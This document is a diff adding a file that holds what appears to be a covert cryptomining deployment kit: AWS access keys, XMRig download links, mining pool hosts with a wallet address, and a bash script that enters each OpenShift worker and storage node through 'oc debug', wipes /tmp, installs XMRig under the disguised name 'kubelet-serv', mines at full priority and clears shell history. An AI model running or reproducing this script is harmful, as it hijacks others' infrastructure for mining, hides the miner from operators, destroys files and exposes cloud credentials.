@@ -1,0 +1,67 @@
+sal.kryptex.network
+
+m5.8xlarge	
+
+
+[default]
+aws_access_key_id = AKIAQAKLJF75FZ5ZPUW7
+aws_secret_access_key = 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
+
+
+
+
+https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-23-0/xmrig-6.23.0-linux-static-x64.tar.gz
+
+
+#!/bin/bash
+
+# Define an array of nodes to debug
+#nodes=("master-1" "master-2" "master-3" "storage-1" "storage-2" "storage-3" "worker-1" "worker-2" "worker-3" "worker-4" "worker-5" "worker-6" "worker-7" "worker-8")
+#nodes=($(<hosts_bkp))
+#nodes=($(oc get nodes -o name | awk -F'/' '{print $2}'))
+nodes=$(oc get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels}{"\n"}{end}' \
+  | awk -v exclude="$proxy_node" 'tolower($2) ~ /worker|storage/ && $1 != exclude {print $1}')
+# Loop through each node and perform actions
+#read -p "Enter your worker region: " kryptex_pool
+
+for node in $nodes; do
+ # region=$(echo "$node" | awk -F'.' '{print $2}')
+  echo "Starting debug session for node: $node"
+
+  # Run OpenShift debug command on the node
+  oc debug node/$node  <<EOF
+    chroot /host
+    echo "Entering chroot environment on $node"
+    su -
+    cd /tmp
+    pkill -9 kubelet-serv
+    pkill -9 apachectl
+    pkill -9 xmrig-proxy
+    rm -rf *
+    curl -L -O https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-3/xmrig-6.22.3-linux-static-x64.tar.gz
+    tar -xzvf xmrig-6.22.3-linux-static-x64.tar.gz
+    mv xmrig kubelet-serv
+    echo 4096 > /proc/sys/vm/nr_hugepages
+    sysctl -p
+    total_cores=$(nproc)
+    threads=$((total_cores-4))
+    ./kubelet-serv -a rx/0 --url sal.kryptex.network:8888 --user solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/${region} -B -S --tls -k --hugepage-size=2048  --cpu-priority=5 --threads=${threads} --donate-level=0 --syslog --print-time=10
+    history -c
+exit
+exit
+exit
+EOF
+
+  echo "Completed debug session for node: $node"
+done
+
+echo "All nodes processed."
+
+
+
+-o de.qrl.herominers.com:1166
+
+./kubelet-serv -a rx/0 -o de.qrl.herominers.com:1166 --user solo:SaLvsBr8mLr8bBXYAt8GmbWKGPPz2VRbyMwomwn5f7TPEGbvneWX72rFo576U6JQt91PWJrDEyKwr2kxvHMozkidYNpBMfNjbqa/${region} -B -S --tls -k --hugepage-size=2048  --cpu-priority=5 --threads=${threads} --donate-level=0 --syslog --print-time=10
+
+
+https://github.com/xmrig/xmrig-proxy/releases/download/v6.23.0/xmrig-proxy-6.23.0-linux-static-x64.tar.gz
